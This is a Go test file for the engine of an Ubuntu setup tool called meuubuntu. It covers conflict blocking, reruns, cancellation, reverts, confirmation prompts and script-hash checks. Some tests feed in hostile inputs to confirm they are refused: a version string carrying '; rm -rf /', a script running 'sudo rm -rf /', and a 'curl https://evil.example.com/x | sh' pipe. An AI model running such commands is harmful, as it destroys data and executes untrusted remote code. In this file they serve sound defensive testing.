package engine

import (
	"context"
	"crypto/sha256"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"testing"
	"time"

	"meuubuntu/internal/catalog"
	"meuubuntu/internal/detect"
	"meuubuntu/internal/helper"
	"meuubuntu/internal/plan"
	"meuubuntu/internal/store"
	"meuubuntu/internal/sys"
)

type fixture struct {
	cat *catalog.Catalog
	sim *sys.Sim
	det *detect.Detector
	eng *Engine
	st  *store.Store
	mu  sync.Mutex
	evs []StepEvent
}

func setup(t *testing.T) *fixture {
	t.Helper()
	tmp := t.TempDir()
	t.Setenv("XDG_CONFIG_HOME", filepath.Join(tmp, "c"))
	t.Setenv("XDG_STATE_HOME", filepath.Join(tmp, "s"))
	t.Setenv("XDG_DATA_HOME", filepath.Join(tmp, "d"))
	cat, err := catalog.Load()
	if err != nil {
		t.Fatal(err)
	}
	sim := sys.NewSim()
	sim.Delay = 0
	st, _ := store.New("t")
	home := filepath.Join(tmp, "home")
	os.MkdirAll(home, 0o700)
	det := &detect.Detector{R: sim, Cat: cat, Sys: detect.ReadSystem(sim, true), Home: home}
	f := &fixture{cat: cat, sim: sim, det: det, st: st}
	fetch := func(u string) ([]byte, error) {
		if strings.Contains(u, "php.new") {
			return []byte("#!/bin/bash\ncurl https://download.herdphp.com/x\n"), nil
		}
		return []byte(`{"uuid":"caffeine@patapon.info","download_url":"/download-extension/x.zip","version":1}`), nil
	}
	f.eng = &Engine{Cat: cat, Det: det, R: sim, Store: st, Home: home, Fetch: fetch, Simulated: true,
		Emit: func(ev string, d any) {
			if s, ok := d.(StepEvent); ok {
				f.mu.Lock()
				f.evs = append(f.evs, s)
				f.mu.Unlock()
			}
		},
		NewAdmin: func() helper.Admin {
			return helper.InProcess{Env: &helper.Env{R: sim, Cat: cat, Root: filepath.Join(tmp, "root"), Codename: "resolute", UID: "1000", Fetch: fetch}}
		}}
	det.Refresh(context.Background())
	return f
}

func (f *fixture) run(t *testing.T, sel map[string]catalog.Selection) (*plan.Plan, store.Run) {
	t.Helper()
	p, err := plan.Build(context.Background(), f.cat, f.det, sel, nil)
	if err != nil {
		t.Fatal(err)
	}
	id, err := f.eng.Start(p, nil)
	if err != nil {
		t.Fatal(err)
	}
	deadline := time.Now().Add(10 * time.Second)
	for f.eng.Running() && time.Now().Before(deadline) {
		time.Sleep(10 * time.Millisecond)
	}
	for _, r := range f.st.Runs() {
		if r.ID == id {
			return p, r
		}
	}
	t.Fatal("run not saved")
	return nil, store.Run{}
}

func TestHardConflictBlocks(t *testing.T) {
	f := setup(t)
	p, err := plan.Build(context.Background(), f.cat, f.det, map[string]catalog.Selection{"docker-engine": {}, "docker-ubuntu": {}}, nil)
	if err != nil {
		t.Fatal(err)
	}
	if !p.Blocked || len(p.Conflicts) == 0 {
		t.Fatalf("expected blocked plan, got %+v", p.Conflicts)
	}
	if _, err := f.eng.Start(p, nil); err == nil {
		t.Fatal("engine must refuse blocked plan")
	}
}

func TestPowerProfilesAreExclusive(t *testing.T) {
	f := setup(t)
	p, _ := plan.Build(context.Background(), f.cat, f.det, map[string]catalog.Selection{"power-balanced": {}, "power-performance": {}}, nil)
	if !p.Blocked {
		t.Fatal("power profiles should be alternatives")
	}
}

func TestInvalidOptionRejected(t *testing.T) {
	f := setup(t)
	_, err := plan.Build(context.Background(), f.cat, f.det, map[string]catalog.Selection{"php": {Options: map[string][]string{"versions": {"8.5; rm -rf /"}}}}, nil)
	if err == nil {
		t.Fatal("expected invalid option error")
	}
}

func TestRunVerifyAndIdempotentRerun(t *testing.T) {
	f := setup(t)
	sel := map[string]catalog.Selection{"htop": {}, "color-scheme": {}, "firefox-flatpak": {}, "tpl-md": {}}
	p, run := f.run(t, sel)
	if run.Status != "done" {
		t.Fatalf("status %s: %+v", run.Status, run.Steps)
	}
	if !f.sim.Packages["htop"] || !f.sim.Flatpaks["org.mozilla.firefox"] || !f.sim.Packages["flatpak"] {
		t.Fatal("expected htop, flatpak and firefox installed (flathub added as dependency)")
	}
	if len(p.Added) == 0 {
		t.Fatal("flathub should be auto-added")
	}
	// Second run: everything already in desired state -> no steps.
	p2, _ := plan.Build(context.Background(), f.cat, f.det, sel, nil)
	if len(p2.Steps) != 0 {
		t.Fatalf("rerun should be a no-op, got %d steps", len(p2.Steps))
	}
}

func TestFailureIsReportedAndRetryWorks(t *testing.T) {
	f := setup(t)
	f.sim.FailPkgs["ncdu"] = true
	_, run := f.run(t, map[string]catalog.Selection{"ncdu": {}, "htop": {}})
	if run.Status != "failed" {
		t.Fatalf("expected failed, got %s", run.Status)
	}
	var failed, done int
	for _, s := range run.Steps {
		switch s.Status {
		case StFailed:
			failed++
		case StDone:
			done++
		}
	}
	if failed != 1 || done < 2 {
		t.Fatalf("expected 1 failure and other steps done: %+v", run.Steps)
	}
	delete(f.sim.FailPkgs, "ncdu")
	p, run2 := f.run(t, map[string]catalog.Selection{"ncdu": {}, "htop": {}})
	if run2.Status != "done" {
		t.Fatalf("retry: %s", run2.Status)
	}
	for _, s := range p.Steps {
		if s.Item == "htop" {
			t.Fatal("retry must skip already-installed htop")
		}
	}
}

func TestCancelStopsAtSafeBoundary(t *testing.T) {
	f := setup(t)
	f.sim.Delay = 80 * time.Millisecond
	p, _ := plan.Build(context.Background(), f.cat, f.det, map[string]catalog.Selection{"htop": {}, "ncdu": {}, "rsync": {}, "vlc": {}}, nil)
	f.eng.Start(p, nil)
	time.Sleep(30 * time.Millisecond)
	f.eng.Cancel()
	for f.eng.Running() {
		time.Sleep(10 * time.Millisecond)
	}
	run := f.st.Runs()[0]
	if run.Status != "cancelled" {
		t.Fatalf("expected cancelled, got %s", run.Status)
	}
	// The step in progress must have finished (not killed), the rest cancelled.
	sawCancelled := false
	for _, s := range run.Steps {
		if s.Status == StRunning {
			t.Fatal("no step may stay running")
		}
		sawCancelled = sawCancelled || s.Status == StCancelled
	}
	if !sawCancelled {
		t.Fatal("expected cancelled steps")
	}
}

func TestRevertOnlyIfUnchanged(t *testing.T) {
	f := setup(t)
	f.run(t, map[string]catalog.Selection{"dock-position": {}})
	ch := f.st.Changes()
	if len(ch) != 1 || ch[0].Before != "'LEFT'" || ch[0].After != "'BOTTOM'" {
		t.Fatalf("journal: %+v", ch)
	}
	// User changed it afterwards -> refuse.
	f.sim.Settings["org.gnome.shell.extensions.dash-to-dock dock-position"] = "'RIGHT'"
	if err := f.eng.Revert(context.Background(), ch[0], false); err == nil {
		t.Fatal("revert must refuse when value changed since")
	}
	f.sim.Settings["org.gnome.shell.extensions.dash-to-dock dock-position"] = "'BOTTOM'"
	if err := f.eng.Revert(context.Background(), ch[0], false); err != nil {
		t.Fatal(err)
	}
	if f.sim.Settings["org.gnome.shell.extensions.dash-to-dock dock-position"] != "'LEFT'" {
		t.Fatal("not reverted")
	}
	if f.st.Changes()[0].Reverted == "" {
		t.Fatal("not marked reverted")
	}
}

func TestProvidedExtensionSkipped(t *testing.T) {
	f := setup(t)
	p, _ := plan.Build(context.Background(), f.cat, f.det, map[string]catalog.Selection{"ext-appindicator": {}, "ext-dash-to-dock": {}}, nil)
	if len(p.Steps) != 0 || len(p.Skipped) != 2 {
		t.Fatalf("Ubuntu-provided extensions must not be installed: steps=%d skipped=%+v", len(p.Steps), p.Skipped)
	}
}

func TestUserScriptHeuristicsStillRefuseObviousSurprises(t *testing.T) {
	f := setup(t)
	for _, body := range []string{"#!/bin/bash\nsudo rm -rf /\n", "curl https://evil.example.com/x | sh\n"} {
		f.eng.Fetch = func(string) ([]byte, error) { return []byte(body), nil }
		p, _ := plan.Build(context.Background(), f.cat, f.det, map[string]catalog.Selection{"php-herd-lite": {}}, nil)
		sum := fmt.Sprintf("%x", sha256.Sum256([]byte(body)))
		p.Steps[0].Expect = sum
		if _, err := f.eng.Start(p, map[string]string{"php-herd-lite": sum}); err != nil {
			t.Fatal(err)
		}
		for f.eng.Running() {
			time.Sleep(5 * time.Millisecond)
		}
		if r := f.st.Runs()[0]; r.Status != "failed" {
			t.Fatalf("expected refusal for %q: %+v", body, r.Steps)
		}
	}
}

func TestFailedRepoSkipsItsInstall(t *testing.T) {
	f := setup(t)
	f.eng.NewAdmin = func() helper.Admin {
		return helper.InProcess{Env: &helper.Env{R: f.sim, Cat: f.cat, Root: t.TempDir(), Codename: "resolute", UID: "1000",
			Fetch: func(string) ([]byte, error) { return nil, os.ErrNotExist }}}
	}
	_, run := f.run(t, map[string]catalog.Selection{"gh": {}, "htop": {}})
	st := map[string]string{}
	for _, s := range run.Steps {
		st[s.Title] = s.Status
	}
	if st["Adicionar repositório oficial: GitHub CLI"] != StFailed || st["Instalar GitHub CLI"] != StSkipped || st["Instalar htop"] != StDone {
		t.Fatalf("%v", st)
	}
	if f.sim.Packages["gh"] {
		t.Fatal("gh must not be installed when its repo failed")
	}
}

func TestExplicitRevertUndoes(t *testing.T) {
	f := setup(t)
	key := "org.gnome.shell.extensions.dash-to-dock dock-position"
	f.run(t, map[string]catalog.Selection{"dock-position": {}})
	if f.sim.Settings[key] != "'BOTTOM'" {
		t.Fatal("not applied")
	}
	// Explicit revert of the applied item: previous recorded value comes back.
	p, err := plan.Build(context.Background(), f.cat, f.det, map[string]catalog.Selection{}, []string{"dock-position", "htop"})
	if err != nil || len(p.Steps) != 1 || p.Steps[0].Op != "undo" {
		t.Fatalf("plan: %+v %v", p.Steps, err)
	}
	id, _ := f.eng.Start(p, nil)
	for f.eng.Running() {
		time.Sleep(5 * time.Millisecond)
	}
	_ = id
	if f.sim.Settings[key] != "'LEFT'" {
		t.Fatalf("expected previous value, got %s", f.sim.Settings[key])
	}
	// Without a record, unchecking resets to the system default.
	f.sim.Settings["org.gnome.desktop.interface color-scheme"] = "'prefer-dark'"
	f.det.Refresh(context.Background())
	p, _ = plan.Build(context.Background(), f.cat, f.det, nil, []string{"color-scheme"})
	f.eng.Start(p, nil)
	for f.eng.Running() {
		time.Sleep(5 * time.Millisecond)
	}
	if f.sim.Settings["org.gnome.desktop.interface color-scheme"] != "'default'" {
		t.Fatal("expected reset to default")
	}
}

func TestRevertOfPackageIsNotAutomatic(t *testing.T) {
	f := setup(t)
	p, _ := plan.Build(context.Background(), f.cat, f.det, nil, []string{"git"})
	if len(p.Steps) != 0 || len(p.Kept) != 1 {
		t.Fatalf("packages must never be removed implicitly: %+v %+v", p.Steps, p.Kept)
	}
}

func TestSourcesCheckRunsBeforeAPT(t *testing.T) {
	f := setup(t)
	p, _ := plan.Build(context.Background(), f.cat, f.det, map[string]catalog.Selection{"htop": {}}, nil)
	if p.Steps[0].Op != "sources-check" {
		t.Fatalf("first step %s", p.Steps[0].Op)
	}
}

func TestPtyxisProfilePlaceholder(t *testing.T) {
	f := setup(t)
	f.run(t, map[string]catalog.Selection{"ptyxis-opacity": {Options: map[string][]string{"opacity": {"0.9"}}}})
	if v := f.sim.Settings["org.gnome.Ptyxis.Profile:/org/gnome/Ptyxis/Profiles/4f6a1c2e9b8d4e7fa1b2c3d4e5f60718/ opacity"]; v != "0.9" {
		t.Fatalf("opacity %q", v)
	}
	delete(f.sim.Settings, "org.gnome.Ptyxis default-profile-uuid")
	st := f.det.State(context.Background(), f.cat.Item("ptyxis-opacity"), catalog.Selection{Options: map[string][]string{"opacity": {"0.9"}}})
	if st.Status != "config" {
		t.Fatalf("missing profile should require configuration, got %s", st.Status)
	}
}

func TestUnselectedItemsAreNeverTouched(t *testing.T) {
	f := setup(t)
	f.run(t, map[string]catalog.Selection{"dock-position": {}})
	// Nothing selected and no explicit revert: an empty plan, system unchanged.
	p, _ := plan.Build(context.Background(), f.cat, f.det, map[string]catalog.Selection{}, nil)
	if len(p.Steps) != 0 {
		t.Fatalf("unselecting must not create steps: %+v", p.Steps)
	}
	if f.sim.Settings["org.gnome.shell.extensions.dash-to-dock dock-position"] != "'BOTTOM'" {
		t.Fatal("system changed")
	}
}

func TestApplyingAndReapplyingKeepsInstalledAppsOutsideTheChoices(t *testing.T) {
	f := setup(t)
	ctx := context.Background()
	f.sim.Packages["flatpak"] = true
	for _, id := range []string{"deja-dup", "openvpn", "rsync", "smb"} {
		for _, pkg := range f.cat.ExpandPackages(f.cat.Item(id), catalog.Selection{}) {
			f.sim.Packages[pkg] = true
		}
	}
	f.sim.Flatpaks["org.freefilesync.FreeFileSync"] = true
	sel := map[string]catalog.Selection{"rsync": {}, "smb": {}, "freefilesync": {}, "htop": {}}
	p, result := f.run(t, sel)
	if result.Status != "done" {
		t.Fatalf("first application failed: %+v", result)
	}
	for _, step := range p.Steps {
		if step.Item == "deja-dup" || step.Item == "openvpn" || step.Item == "rsync" || step.Item == "smb" || step.Item == "freefilesync" {
			t.Fatalf("installed app must not be reapplied or removed: %+v", step)
		}
	}
	for _, id := range []string{"deja-dup", "openvpn", "rsync", "smb"} {
		for _, pkg := range f.cat.ExpandPackages(f.cat.Item(id), catalog.Selection{}) {
			if !f.sim.Packages[pkg] {
				t.Fatalf("installed package %s was lost", pkg)
			}
		}
	}
	if !f.sim.Flatpaks["org.freefilesync.FreeFileSync"] {
		t.Fatal("existing Flatpak must be preserved")
	}
	// Repeat after installing the only missing application.
	repeated, err := plan.Build(ctx, f.cat, f.det, sel, nil)
	if err != nil {
		t.Fatal(err)
	}
	if len(repeated.Steps) != 0 {
		t.Fatalf("reapplying the same choices should have no work: %+v", repeated.Steps)
	}
	// Removing a configured adjustment from the choices does not request a revert.
	f.run(t, map[string]catalog.Selection{"dock-position": {}})
	p, err = plan.Build(ctx, f.cat, f.det, map[string]catalog.Selection{"htop": {}}, nil)
	if err != nil || len(p.Steps) != 0 || f.sim.Settings["org.gnome.shell.extensions.dash-to-dock dock-position"] != "'BOTTOM'" {
		t.Fatalf("unselected adjustment must stay configured: %+v %v", p, err)
	}
}

func TestConfirmationRequired(t *testing.T) {
	f := setup(t)
	p, _ := plan.Build(context.Background(), f.cat, f.det, map[string]catalog.Selection{"firefox-snap-remove": {}}, nil)
	if len(p.Steps) == 0 || p.Steps[0].Confirm == "" {
		t.Fatalf("snap removal must require confirmation: %+v", p.Steps)
	}
	if _, err := f.eng.Start(p, nil); err == nil {
		t.Fatal("must refuse without explicit confirmation")
	}
	if _, err := f.eng.Start(p, map[string]string{"firefox-snap-remove": "yes"}); err != nil {
		t.Fatal(err)
	}
	for f.eng.Running() {
		time.Sleep(5 * time.Millisecond)
	}
	if f.sim.Snaps["firefox"] {
		t.Fatal("snap not removed after confirmation")
	}
}

func TestScriptMustMatchReviewedHash(t *testing.T) {
	f := setup(t)
	p, _ := plan.Build(context.Background(), f.cat, f.det, map[string]catalog.Selection{"php-herd-lite": {}}, nil)
	p.Steps[0].Expect = "deadbeef" // what the user reviewed
	if _, err := f.eng.Start(p, map[string]string{"php-herd-lite": "deadbeef"}); err != nil {
		t.Fatal(err)
	}
	for f.eng.Running() {
		time.Sleep(5 * time.Millisecond)
	}
	run := f.st.Runs()[0]
	if run.Status != "failed" || !strings.Contains(run.Steps[0].Error, "mudou desde a revisão") {
		t.Fatalf("changed script must not run: %+v", run.Steps)
	}
}

func TestExtensionsUnknownWhenListingFails(t *testing.T) {
	f := setup(t)
	f.det.R = failingExt{f.sim}
	f.det.Refresh(context.Background())
	st := f.det.State(context.Background(), f.cat.Item("ext-dash-to-dock"), catalog.Selection{})
	if st.Status != "unknown" {
		t.Fatalf("got %s", st.Status)
	}
	p, _ := plan.Build(context.Background(), f.cat, f.det, map[string]catalog.Selection{"ext-dash-to-dock": {}}, nil)
	if len(p.Steps) != 0 {
		t.Fatal("unknown extension state must not be installed blindly")
	}
}

type failingExt struct{ *sys.Sim }

func (r failingExt) Output(ctx context.Context, name string, args ...string) (string, error) {
	if name == "gnome-extensions" {
		return "", os.ErrPermission
	}
	return r.Sim.Output(ctx, name, args...)
}
